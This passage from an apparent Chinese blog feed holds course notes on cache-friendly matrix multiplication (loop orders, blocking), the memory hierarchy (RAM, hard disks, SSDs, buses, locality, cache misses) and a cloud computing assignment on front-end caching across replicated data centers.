<p><img src="/images/14556324266700.jpg" alt=""></p>
<p>因为 C 语言是根据行来分配数组内存的，所以按照列的顺序来访问，可以得到最好的 spatial locality。假设我们需要读入 N 个连续的字节，如果缓存的 block 大小为 B 个字节，那么实际上真正需要去内存中访问是 N/B 次（这种时候会 miss）。但是如果按照行来访问，每次都是跳着来，miss rate 就是百分之百。</p>
<p><img src="/images/14556327200253.jpg" alt=""></p>
<p>而 <code>ijk</code> 的访问模式，处理矩阵 A 的时候是按列访问的，因为这里设定一个 block 可以存放 4 个 double，读入每四个元素的情况下，我们只会在读入第一个 double 的时候 miss，所以对于矩阵 A 来说，内部的循环（就是 k 的那个循环）每次迭代平均会 miss 0.25 次（就是 1/4 次）。而访问矩阵 B 的时候，因为是按照行访问的，缓存实际上没有任何用，同样的条件下，每次迭代都会 miss。（我们还可以发现 <code>jik</code> 的访问模式和 <code>ijk</code> 很类似，这里略过）</p>
<p>但是如果换一下顺序，变成 <code>kij</code> 的访问模式，就会有不一样的变化，代码如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* kij */</span></span><br><span class="line"><span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)&#123;</span><br><span class="line">    <span class="keyword">for</span> (i =<span class="number">0</span>; i &lt; n; i++) &#123;</span><br><span class="line">        r = a[i][k];</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            c[i][j] += r * b[k][j];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>对应的访问模式：</p>
<p><img src="/images/14556331411420.jpg" alt=""></p>
<p>可以看到对于矩阵 B 和 C 来说都是按照列访问的（就是横着），所以内循环中每次迭代只会 miss 0.25 次（<code>ikj</code> 的访问模式也是如此）</p>
<p>当然还可以使用 <code>jki</code> 或 <code>kji</code> 的访问模式，这种模式下对于矩阵 A 和 C 的访问都是按行访问的（就是竖着），内循环中每次迭代都会 miss 1 次，是很糟糕的</p>
<p>比较一下：</p>
<p><img src="/images/14556333212757.jpg" alt=""></p>
<p>就可以发现不同的访问模式会产生巨大的影响，下面的表格更加能说明问题：</p>
<p><img src="/images/14556334394809.jpg" alt=""></p>
<h3 id="u5229_u7528_blocking__u63D0_u9AD8_temporal_locality"><a href="#u5229_u7528_blocking__u63D0_u9AD8_temporal_locality" class="headerlink" title="利用 blocking 提高 temporal locality"></a>利用 blocking 提高 temporal locality</h3><p>还是矩阵相乘的例子，先看代码</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">c = (<span class="keyword">double</span> *) <span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">double</span>), n*n);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Multiply n x n matrices a and b */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmm</span><span class="params">(<span class="keyword">double</span> *a, <span class="keyword">double</span> *b, <span class="keyword">double</span> *c, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j++)</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k++)</span><br><span class="line">                c[i*n + j] += a[i*n + k] * b[k*n + j];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们假设矩阵的元素是 double，缓存的每个 line 可以容纳 8 个 double，整个缓存的大小 C 远小于 n。</p>
<p>对应的访问模式为：</p>
<p><img src="/images/14556337275150.jpg" alt=""></p>
<p>进行计算的时候，对于矩阵 a，因为是一行一行读取的，在读取第一个 double 的时候，后面 7 个也会被载入缓存（miss 数目为 n/8），但是对于矩阵 b，因为是一列一列读取的，所以每次都需要更新缓存（miss 数目为 n）</p>
<p><img src="/images/14556342437811.jpg" alt=""></p>
<p>所以总的 miss 数目为：$\frac{9n}{8}\times n^2=\frac{9}{8}n^3$</p>
<p>但是如果我们把矩阵分成一块一块来计算，就会有不一样的效果：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">c = (<span class="keyword">double</span> *) <span class="built_in">calloc</span>(<span class="keyword">sizeof</span>(<span class="keyword">double</span>), n*n);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* Multiply n x n matrices a and b */</span></span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">mmm</span><span class="params">(<span class="keyword">double</span> *a, <span class="keyword">double</span> *b, <span class="keyword">double</span> *c, <span class="keyword">int</span> n)</span></span>&#123;</span><br><span class="line">    <span class="keyword">int</span> i, j, k;</span><br><span class="line">    <span class="keyword">int</span> i1, j1, k1;</span><br><span class="line">    <span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i+=B)</span><br><span class="line">        <span class="keyword">for</span> (j = <span class="number">0</span>; j &lt; n; j+=B)</span><br><span class="line">            <span class="keyword">for</span> (k = <span class="number">0</span>; k &lt; n; k+=B)</span><br><span class="line">            <span class="comment">/* B x B mini matrix multiplications */</span></span><br><span class="line">                <span class="keyword">for</span> (i1 = i; i1 &lt; i+B; i1++)</span><br><span class="line">                    <span class="keyword">for</span> (j1 = j; j1 &lt; j+B; j1++)</span><br><span class="line">                        <span class="keyword">for</span> (k1 = k; k1 &lt; k+B; k1++)</span><br><span class="line">                            c[i1*n+j1] += a[i1*n+k1] * b[k1*n + j1];</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>也就是如下图所示：</p>
<p><img src="/images/14556343880865.jpg" alt=""></p>
<p>这里我们加一个条件，假设缓存中可以放下 3 个 Block，即 $3B^2 &lt; C$。</p>
<p><img src="/images/14556347788350.jpg" alt=""></p>
<p>那么在计算的时候，这三个 Block 其实都可以放到缓存中。对于每个 Block 来说，一共有 $B^2$ 个元素，8 个元素会 miss 一次，所以一共会 miss $\frac{B^2}{8}$ 次。而一次完整的计算（指算完整行乘以整列），矩阵 a 和 b 都需要读入 $\frac{n}{B}$ 个 block，所以总的 miss 数目是 $\frac{2n}{B}\times \frac{B^2}{8} = \frac{nB}{4}$（这里的 2n 是因为矩阵 a 和 b 各有 n/B 个 Block）。</p>
<p>而对于整个矩阵 c 来说，一共有 $(\frac{n}{B})^2$ 个 block，所以整个计算过程的 miss 数目为：</p>
<p>$$\frac{nB}{4}\times (\frac{n}{B})^2 = \frac{n^3}{4B}$$</p>
<p>比较一下，一个是 $\frac{9}{8} n^3$，另一个是 $\frac{1}{4B} n^3$，有巨大的差异！，但是需要保证的就是 $3B^2 &lt; C$（所以需要针对机器进行调整）</p>
<p>总结下</p>
<ul>
<li>Cache memories 对性能会有极大的影响</li>
<li>写代码的时候可以考虑<ul>
<li>关注内循环，尤其是访问元素的顺序和方向</li>
<li>以 stride 1 的顺序来访问可以最大化 spatial locality</li>
<li>尽可能多利用读入的数据（重复使用）来最大化 temporal locality</li>
</ul>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>上一讲我们了解了存储的相关知识，这节课我们来更加深入研究一下 cache memory 的知识。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="组成原理" scheme="http://wdxtub.com/tags/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
      <category term="缓存" scheme="http://wdxtub.com/tags/%E7%BC%93%E5%AD%98/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[深入理解计算机系统 第 11 课 Memory Hierarchy]]></title>
    <link href="http://wdxtub.com/2016/02/15/csapp-11/"/>
    <id>http://wdxtub.com/2016/02/15/csapp-11/</id>
    <published>2016-02-15T15:13:51.000Z</published>
    <updated>2016-02-15T19:44:01.000Z</updated>
    <content type="html"><![CDATA[<p>从这一讲开始我们会介绍有关存储的知识（估计前面的汇编已经看得够呛了吧），个人的感觉来说会稍微轻松一些，但是概念比较多，一定要弄清楚再继续。</p>
<a id="more"></a>
<hr>
<h2 id="RAM"><a href="#RAM" class="headerlink" title="RAM"></a>RAM</h2><p>按照 Sheldon 的做法，我们当然要从历史说起，了解存储设备所用的技术以及发展趋势，对我们理解内存层级背后的原因很有帮助。</p>
<p>RAM(Random-Access Memory) 有两种类型：SRAM(Static RAM) 和 DRAM(Dynamic RAM)，SRAM 非常快，也不需要定期刷新，通常用在处理器做缓存，但是比较贵；DRAM 稍慢一点（大概是 SRAM 速度的十分之一），需要刷新，通常用作主内存，相比来说很便宜（是 SRAM 价格的百分之一）。</p>
<p>无论是 DRAM 还是 SRAM，一旦不通电，所有的信息都会丢失。如果想要让数据持久化，可以考虑 ROM, PROM, EPROM, EEPROM 等介质。固件程序会存储在 ROM 中（比如 BIOS，磁盘控制器，网卡，图形加速器，安全子系统等等）。另外一个趋势就是 SSD 固态硬盘，取消了机械结构，更稳定速度更快更省电。</p>
<h2 id="u786C_u76D8"><a href="#u786C_u76D8" class="headerlink" title="硬盘"></a>硬盘</h2><p>传统的机械硬盘有许多不同的部件：</p>
<p><img src="/images/14555548218373.jpg" alt=""></p>
<p>虽然现在越来越多电脑已经改为使用固态硬盘，但是还是有必要了解一下硬盘的组成的。首先需要知道是，机械硬盘有许多片 platter 组成，每一片 platter 有两面；每一面由一圈圈的 track 组成，而每个 track 由 gap 分隔成不同的 sector。这里概念层层递进，可以结合下图仔细辨析清楚。</p>
<p><img src="/images/14555549124076.jpg" alt=""></p>
<p>上图是一个 platter 的视图，多个 platter 组合起来是这样的：</p>
<p><img src="/images/14555550788288.jpg" alt=""></p>
<p>硬盘的容量指的是最大能存储的比特数，通常用 GB 来做单位。1 GB 相当于 10 的 9 次方个 Byte。与硬盘的结构分层类似，容量取决于下面三个方面：</p>
<ul>
<li>记录密度(bits/in)：track 中 1 英寸能保存的字节数</li>
<li>Track 密度(tracks/in)：1 英寸直径能保存多少条 track</li>
<li>Areal 密度(bits/in 的平方)：上面两个数值的乘积</li>
</ul>
<p><img src="/images/14555611007547.jpg" alt=""></p>
<p>现在硬盘会把相邻的若干个 track 切分成小块，每一块叫做 recording zones。 recording zone 中的每个 track 都包含同样数量的 sector；但是每个 zone 中包含的 sector 和 track 的数目是不一样的，外层的更多，内层的更少；正因为如此，我们计算容量是，用的是平均的数值。</p>
<p>容量 Capacity = (# bytes/sector) x (avg. # sectors/track) x (# tracks/surface) x (# surfaces/platter) x (# platters/disk)</p>
<p>举个例子，假如一个硬盘有：</p>
<ul>
<li>512 bytes/sector</li>
<li>300 sectors/track (平均)</li>
<li>20000 tracks/surface</li>
<li>2 surfaces/platter</li>
<li>5 platters/disk</li>
</ul>
<p>总的容量为 = 512 x 300 x 20000 x 2 x 5 = 30,720,000,000 = 30.72 GB</p>
<p>具体的工作模式大概是这样的：</p>
<p><img src="/images/14555616594586.jpg" alt=""></p>
<p><img src="/images/14555616894770.jpg" alt=""></p>
<p>假设我们现在已经从蓝色区域读取完了数据，接下来需要从红色区域读，首先需要寻址，把读取的指针放到红色区域所在的 track，然后等待磁盘旋转，旋转到红色区域之后，才可以开始真正的数据传输过程。</p>
<p>总的访问时间  Taccess =  寻址时间 Tavg seek + 旋转时间 Tavg rotation + 传输时间 Tavg transfer</p>
<ul>
<li>寻址时间 Tavg seek 因为物理规律的限制，一般是 3-9 ms</li>
<li>旋转延迟 Tavg rotation 取决于硬盘具体的转速，一般来说是 7200 RPM</li>
<li>传输时间 Tavg tranfer 就是需要读取的 sector 数目</li>
</ul>
<p>举个例子，假设转速是 7200 RPM，平均寻址时间 9ms，平均每个 track 的 sector 数目是 400，那么我们有：</p>
<ul>
<li>Tavg rotation = 1/2 x (60 secs / 7200 RPM) x 1000 ms/sec = 4 ms</li>
<li>Tavg transfer = 60 / 7200 RPM x 1/400 secs/track x 1000 ms/sec = 0.02 ms</li>
<li>Taccess = 9 ms + 4 ms + 0.02 ms</li>
</ul>
<p>从这里可以看出，主要决定访问时间的是寻址时间和旋转延迟；读取一个 sector 的第一个 bit 是非常耗时的，之后的都几乎可以忽略不计；硬盘比 SRAM 慢 40,000 倍，比 DRAM 慢 2500 倍。</p>
<p>最后需要知道的就是逻辑分区和实际的物理分区的区别，为了使用方便，会用连续的数字来标志所有可用的 sector，具体的映射工作由磁盘控制器完成。</p>
<p>接下来介绍一下固态硬盘，大概的结构如下：</p>
<p><img src="/images/14555629267132.jpg" alt=""></p>
<p>固态硬盘中分成很多 Block，每个 Block 又有很多 Page（大约 32-128 个），每个 Page 可以存放一定数据（大概 4-512KB），进行数据读写的最小单位，就是 Page，但是有一点需要注意，对一个 Page 进行写入操作的时候，需要先把整个 Block 清空（设计限制），而一个 Block 大概在 100,000 次写入之后就会报废。</p>
<p><img src="/images/14555634433688.jpg" alt="Intell SSD 730 产品规格"></p>
<p>与传统的机械硬盘相比，固态硬盘在读写速度上有很大的优势。但是因为设计本身的约束，连续访问会比随机访问快，而且如果需要写入 Page，那么需要移动其他 Page，擦除整个 Block，然后才能写入。现在固态硬盘的读写速度差距已经没有以前那么大了，但是仍然有一些差距。</p>
<p>不过与机械硬盘相比，固态硬盘存在一个具体的寿命限制，价格也比较贵，但是因为速度上的优势，越来越多设备开始使用固态硬盘。</p>
<h2 id="u603B_u7EBF"><a href="#u603B_u7EBF" class="headerlink" title="总线"></a>总线</h2><p>总线是用来传输地址、数据和控制信号的一组平行的电线，通常来说由多个设备共享，类似于不同城市之间的高速公路，可以传输各类数据。CPU 通过总线和对应的接口来从不同的设备中获得所需要的数据，放入寄存器中等待运算，像下面这样：</p>
<p><img src="/images/14555626366163.jpg" alt=""></p>
<p>假设 CPU 需要从硬盘中读取一些数据，会给定指令，逻辑块编号和目标地址，并发送给磁盘控制器。然后磁盘控制器会读取对应的数据，并通过 DMA(direct memory access)把数据传输到内存中；传输完成后，磁盘控制器通过 interrupt 的方式通知 CPU，然后 CPU 完成之后的工作。</p>
<p>总线上连接的各个设备，其访问速度有天壤之别，不同的技术发展速度不同，更加剧了这个情况：</p>
<p><img src="/images/14555636595434.jpg" alt=""></p>
<p>比方说磁盘的读写速度，30 年大概只提高了一个数量级多一点，所以固态硬盘的出现，以下拯救了劳苦大众（提高了两个数量级），DRAM 的发展，一路从 DDR12345 发展来，速度大概提高了一个数量级，不过 SRAM 则是在同一个起点愣是多跑了一个数量级，总体来说是跟着 CPU 的发展走的。不过 CPU 的发展在 2003 年也遇到了问题（单个核心基本到极限），不过多核的出现以及技术优化，总体来说还是使得执行速度越来越快。</p>
<p>那么这么大的时间差距，怎么办呢？难道根据木桶理论，都要取决于最慢的那个吗？不一定！Locality 可以在一定程度上拯救世界。</p>
<h2 id="Locality"><a href="#Locality" class="headerlink" title="Locality"></a>Locality</h2><p>Locality 的思路很简单，就是如果一个数据最近被访问过，很可能还会被再次访问：</p>
<ul>
<li>Temporal locality: Recently referenced items are likely to be referenced again in the near future</li>
<li>Spatial locality: Items with nearby addresses tend to be referenced close together in time</li>
</ul>
<p>举个例子：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">sum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">for</span> (i = <span class="number">0</span>; i &lt; n; i++)&#123;</span><br><span class="line">    sum += a[i];</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">return</span> sum;</span><br></pre></td></tr></table></figure>
<p>这里每次循环都会访问 <code>sum</code>，是 temporal locality；而访问数组是连续访问的，是 spatial locality。</p>
<p>根据这个特性，在写遍历数组的时候（尤其是高维），尤其要注意按照内存排列顺序来访问，不然性能会惨不忍睹。</p>
<h2 id="Memory_Heirarchy"><a href="#Memory_Heirarchy" class="headerlink" title="Memory Heirarchy"></a>Memory Heirarchy</h2><p>一种介质的速度越快，就会越贵，同时也消耗更多的电量，所以一般容量比较小。而 CPU 和内存之间的速度差距越来越大，所以好的程序都会尽可能利用 locality。根据这些特性，也就引申出了一个安排存储的方式，称为 memory hierarchy。</p>
<p><img src="/images/14555647586566.jpg" alt=""></p>
<p>这里就涉及到一个技术：缓存。缓存可以看作是把大且缓慢的设备中的数据的一部分拿出来存储到其中的更快的存储设备。在 memory hierarchy 金字塔中，每一层都可以看作是下一层的缓存。利用 locality，程序会更倾向于访问第 k 层的数据，而非第 k+1 层，这样就减少了访问时间。</p>
<p><img src="/images/14555654345569.jpg" alt=""></p>
<blockquote>
<p>The memory hieracy creates a large pool of storage that costs as much as the cheap storage near the bottom, but that serves data to programs at the rate of the fast storage near the top.</p>
</blockquote>
<p><img src="/images/14555650316337.jpg" alt=""></p>
<p>在上图中，假如程序请求的是 10，那么 10 正好在缓存中，即 cache hit，就可以节约时间。但是如果程序请求的是 12，因为 12 不在缓存中，即 cache miss，就必须从内存中获取，并替换缓存中的某个数据（具体替换哪一个，由 placement policy 和 replacement policy 决定）</p>
<h3 id="Cache_Miss"><a href="#Cache_Miss" class="headerlink" title="Cache Miss"></a>Cache Miss</h3><p>Cache miss 有三种：</p>
<ul>
<li>Cold(compulsory) Miss: CPU 第一次访问相应 cache 块，cache 中肯定没有该 cache 块，这是不可避免的</li>
<li>Confilict Miss: 在直接相联或组相联的 cache 中，不同的 cache 块由于 index 相同相互替换，引起的失效叫做冲突失效<ul>
<li>假设这里有 32KB 直接相联的 cache</li>
<li>如果有两个 8KB 的数据需要来回访问，但是这两个数组都映射到相同的地址，cache 大小足够存储全部的数据，但是因为相同地址发生了冲突需要来回替换，发生的失效则全都是冲突失效（第一次访问失效依旧是强制性失效），这时 cache 并没有存满</li>
</ul>
</li>
<li>Capacity Miss: 有限的 cache 容量导致 cache 放不下而被替换出 cache 块，被替换出去的 cache 块再被访问，引起的失效叫做容量失效<ul>
<li>假设这里有 32KB 直接相联的 cache</li>
<li>如果有一个 64KB 的数组需要重复访问，数组的大小远远大于 cache 大小，没办法全部放入 cache。第一次访问数组发生的失效全都是强制性失效。之后再访问数组，再发生的失效则全都是容量失效，这时 cache 已经存满，容量不足以存储全部数据</li>
</ul>
</li>
</ul>
]]></content>
    <summary type="html">
    <![CDATA[<p>从这一讲开始我们会介绍有关存储的知识（估计前面的汇编已经看得够呛了吧），个人的感觉来说会稍微轻松一些，但是概念比较多，一定要弄清楚再继续。</p>]]>
    
    </summary>
    
      <category term="CMU" scheme="http://wdxtub.com/tags/CMU/"/>
    
      <category term="内存层级" scheme="http://wdxtub.com/tags/%E5%86%85%E5%AD%98%E5%B1%82%E7%BA%A7/"/>
    
      <category term="组成原理" scheme="http://wdxtub.com/tags/%E7%BB%84%E6%88%90%E5%8E%9F%E7%90%86/"/>
    
      <category term="计算机" scheme="http://wdxtub.com/tags/%E8%AE%A1%E7%AE%97%E6%9C%BA/"/>
    
      <category term="Technique" scheme="http://wdxtub.com/categories/Technique/"/>
    
  </entry>
  
  <entry>
    <title><![CDATA[云计算 第 13 课 缓存]]></title>
    <link href="http://wdxtub.com/2016/02/15/cc-13/"/>
    <id>http://wdxtub.com/2016/02/15/cc-13/</id>
    <published>2016-02-15T11:04:35.000Z</published>
    <updated>2016-02-16T03:22:48.000Z</updated>
    <content type="html"><![CDATA[<p>前面我们已经了解了如何进行 autoscaling 和自定义负载均衡器，这一课我们来接触另一个在 web 服务中非常重要的概念——缓存。</p>
<a id="more"></a>
<hr>
<h2 id="u5B66_u4E60_u76EE_u6807"><a href="#u5B66_u4E60_u76EE_u6807" class="headerlink" title="学习目标"></a>学习目标</h2><ol>
<li>了解在 web 服务中缓存所扮演的角色</li>
<li>比较影响缓存的两个方面：temporal locality 和 spatial locality</li>
<li>部署一个使用缓存的 web 服务</li>
<li>比较不同的缓存策略对性能的影响</li>
</ol>
<p>先来看看数据格式，保存在 data center 中的数据格式是：</p>
<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="title">targetID</span><span class="params">(数字)</span></span>, first_name, last_name, encrypted <span class="function"><span class="title">data</span><span class="params">(文本)</span></span></span><br></pre></td></tr></table></figure>
<p>而客户端（在这里就是 load generator）发给 data center 的数据格式是：</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Target <span class="tag">&lt;<span class="title">targetID</span>&gt;</span> first_name last_name’s encrypted conversations are: <span class="tag">&lt;<span class="title">conversations</span>&gt;</span></span><br></pre></td></tr></table></figure>
<p>每个 data center 在同一时间大概能够缓存 10000 条记录，但是面对 load generator 仍然有些力不从心，我们的任务就是利用缓存来提高性能。</p>
<p>不少互联网应用都需要大量的资源，提高性能的方法很多，其中一个就是我们之前尝试过的 horizontal 和 vertical scaling。这种方式虽然比较方便，但是贵呀，能不能在已有资源限制的情况下，尽可能提高性能呢？两个比较常见的办法是『缓存(caching)』和『复制(replication)』。</p>
<p>复制、缓存和负载均衡可以在不对数据进行分割的情况下提高性能。很多工具（比如 Varnish, Squid, memcached）可以完成缓存这项任务，把最常用的资源保存下来。这样有两个好处：</p>
<ol>
<li>系统不必重复运算，节约计算资源</li>
<li>可以快速向用户返回结果</li>
</ol>
<p>另外一个比较常见的方法是『复制』，通常会与缓存结合使用。系统会保存多个全部数据集的副本，这样系统可以同时访问多个不同资源。使用『复制』方法的时候，需要注意以下几点：</p>
<ol>
<li>需要确定一个分配用户请求的策略，可以是内容相关的（即特定请求会重定向至特定机器）或者是内容无关的</li>
<li>『复制』的实例本身需要实时监控，避免出现负载不均衡的问题</li>
<li>在进行内容写入的时候，还需要保证数据一致性（但是在这次的作业中不要求）</li>
</ol>
<p>这周我们要处理的系统，后端有两个『复制』的数据库。除了可以应对大负载，某种程度上来说也提高了容错性（比如说数据库损坏）。任何时候，只有一个实例在运行，都是很危险的。具体的架构见下图：</p>
<p><img src="/images/14555365484111.jpg" alt="图 A，从数据库中获取数据；图 B，从前端缓存中获取数据"></p>
<p>说明以下上图的例子，前端访问数据库需要 1 ms(单向)，从数据库中获取数据需要 10 ms，而直接访问前端获取一次数据需要 2 ms(单向)，同一条记录，如果没有缓存，那么一共需要 16ms 来完成整个操作，而如果有缓存，则只需要 4 ms。</p>
<ul>
<li>Temporal locality: 假如一条记录刚刚被用到，那么很可能之后也会被常用到</li>
<li>Spatial locality: 假如一条记录刚刚被用到，那么很可能它附近的几条记录也会被用到</li>
</ul>
<p>另外一个需要注意的是，除了前端这个显式缓存，无论是数据库还是文件系统都会有自己的缓存系统，比方说 data center 会缓存最近的 10000 条记录，我们访问一条没有在前端缓存的记录时，如果它已经被 data center 缓存，那么整个可能寻找数据只需要 6 ms(而不是之前的 10 ms)。</p>
<p>注意事项</p>
<ul>
<li>用 Java 写，Azure 部分就有 100% 的分数，提交的代码中不要出现：    <code>Appid</code>, <code>appkey</code>, <code>storage account key</code> 和 <code>endpoint url</code></li>
<li>最多只能在前端存储 1000 条记录</li>
<li>做 AWS 的部分记得打上 <code>Project : 2.3</code> 的标签</li>
</ul>
<p>系统镜像 Azure</p>
<ul>
<li>Data Center, <code>Standard_D1</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p23dcv5-osDisk.dc552bc1-518d-451e-b856-c0419a6adcdb.vhd</code></li>
<li>Load Generator, <code>Standard_D1</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p23lgv4-osDisk.40d2443e-9f8c-41ce-9826-e0d7792a6c27.vhd</code></li>
<li>前端, <code>Standard_A0</code>, <code>https://cc15319619.blob.core.windows.net/system/Microsoft.Compute/Images/vhds/cc15619p23fe-osDisk.8d5f0df8-c94d-43e0-8a11-77ba440e0d8f.vhd</code></li>
</ul>
<p>系统镜像 AWS</p>
<ul>
<li>Data Center, <code>m3.medium</code>, <code>ami-1b193371</code></li>
<li>Load Generator, <code>m3.medium</code>, <code>ami-c00134aa</code></li>
<li>前端, <code>m3.medium</code>, <code>ami-6f2a1f05</code></li>
</ul>
<h2 id="u7F13_u5B58_u6D4B_u8BD5"><a href="#u7F13_u5B58_u6D4B_u8BD5" class="headerlink" title="缓存测试"></a>缓存测试</h2><p>研究 trace file 来确定缓存的策略。Data Center 各可以缓存 10000 条记录，并提供以下接口：</p>
<ul>
<li><code>/target?targetID=X</code> 返回结果并缓存</li>
<li><code>/range?start_range=X&amp;end_range=Y</code> 缓存一个范围内的结果（以 <code>;</code> 分隔）并缓存</li>
</ul>
<h3 id="u4EFB_u52A1_u5217_u8868"><a href="#u4EFB_u52A1_u5217_u8868" class="headerlink" title="任务列表"></a>任务列表</h3><ol>
<li>启动一个 <code>Standard_A0</code> 虚拟机作为前端</li>
<li>SSH 到前端，账户 <code>ubuntu</code> 密码 <code>Cloud@123</code></li>
<li>文件夹 <code>vertx</code> 中有 <code>MSB.java</code> 和 <code>run_vertx.sh</code></li>
<li>熟悉 <code>MSB.java</code> 中的代码</li>
<li>启动两个 <code>Standard_D1</code> 虚拟机作为 data center</li>
<li>在 <code>MSB.java</code> 文件中，把两个 data center 的 DNS 填写进去，格式为 <code>xxx.eastus.cloudapp.azure.com</code></li>
<li>修改 <code>retrieveDetails</code> 函数，提高性能，现在代码已经是可以运行的，可以运行来体验下整个过程 </li>
<li>可以在前端机器上存储 1000 条记录以提高性能。具体用什么数据结构和载入策略都可以自己决定。唯一的限制就是不能超出 1000 条的上限。</li>
<li>改动完成后可以用下面的命令启动 web 服务：<code>./run_vertx.sh</code></li>
<li>确定代码没有问题后，可以开启一个 <code>Standard_D1</code> 虚拟机作为 load generator，在浏览器中访问其 DNS 就可以看到界面</li>
<li>提交密码和 andrew id</li>
<li>填写前端 DNS 地址以开始 Trace 1 测试，目标是 145 RPS</li>
<li>填写前端 DNS 地址以开始 Trace 2 测试，目标是 145 RPS</li>
<li>填写前端 DNS 地址以开始 MSB Trace 测试，目标是 145 RPS </li>
<li>测试的时候可以在浏览器里查看日志</li>
</ol>
<h3 id="u63D0_u793A"><a href="#u63D0_u793A" class="headerlink" title="提示"></a>提示</h3><ul>
<li>研究清楚 web 服务的代码再开启 load generator 和 data center</li>
<li>可以随意修改 <code>MSB.java</code>，唯一需要注意的是不能缓存超过 1000 条记录</li>
<li>统计系统中的不同组件的延迟来找出哪里更加需要优化</li>
<li>了解 temporal locality 和 spatial locality，思考如何可以在代码中利用这两个特性</li>
<li>开始 MSB Trace Test 之前确保已经通过了前两个测试</li>
<li>执行 <code>run_vertx.sh</code> 之后，可以使用 <code>sudo cat nohup.out</code> 来查看日志</li>
<li>前两个测试可以通过观察请求中的 id 来进行策略设计，但 MSB Trace 测试需要更加复杂的缓存机制</li>
<li>我们手头上有两台数据相同的 data center，各有不同的缓存，想想如何利用这个特点来提高效率（不同的请求发送给不同的主机，需要分类）</li>
<li>了解同步和异步请求的概念，data center 提供 web 服务对数据库进行异步请求，看看这部分代码是怎么实现的</li>
<li>这里只会对数据库进行读取，所以不需要考虑数据一致性的问题</li>
<li>只需要提交 MSB Trace Test 的代码，把所有代码放到一个 zip 包里，用 load generator 提交</li>
<li>每当 cache 有 miss 的时候，输出一下，找找规律</li>
</ul>
<p><strong>参考资料</strong></p>
<ul>
<li>Rabinovich, Michael, and Oliver Spatscheck. Web caching and replication. Boston, USA: Addison-Wesley…”</li>
<li><a href="http://www.cs.berkeley.edu/~brewer/Giant.pdf" target="_blank" rel="external">Brewer, Eric A. “Lessons from giant-scale services.” Internet Computing, IEEE 5.4 (2001): 46-55</a></li>
<li><a href="http://www.distributed-systems.net/papers/2007.ic.pdf" target="_blank" rel="external">Sivasubramanian, Swaminathan, et al. “Analysis of caching and replication strategies for web applications.” Internet Computing, IEEE 11.1 (2007): 60-66</a></li>
<li><a href="http://www.akamai.com/dl/technical_publications/ConsistenHashingandRandomTreesDistributedCachingprotocolsforrelievingHotSpotsontheworldwideweb.pdf" target="_blank" rel="external">Karger, David, et al. “Consistent hashing and random trees: Distributed caching protocols for relieving hot spots on the World Wide Web.” Proceedings of the twenty-ninth annual ACM symposium on Theory of computing. ACM, 1997</a></li>
<li><a href="http://www.cs.cmu.edu/~hl/papers/loadbal-socc2011.pdf" target="_blank" rel="external">Fan, Bin, et al. “Small cache, big effect: Provable load balancing for randomly partitioned cluster services.” Proceedings of the 2nd ACM Symposium on Cloud Computing. ACM, 2011</a></li>
</ul>
<h3 id="AWS__u90E8_u5206"><a href="#AWS__u90E8_u5206" class="headerlink" title="AWS 部分"></a>AWS 部分</h3><p>这一部分是选做的，基本要求一样，有以下需要注意的的：</p>
<ul>
<li>安全组中要打开 80 端口</li>
<li>AWS 的地址格式和 Azure 的稍有不同</li>
<li>性能的要求是 142 RPS</li>
</ul>
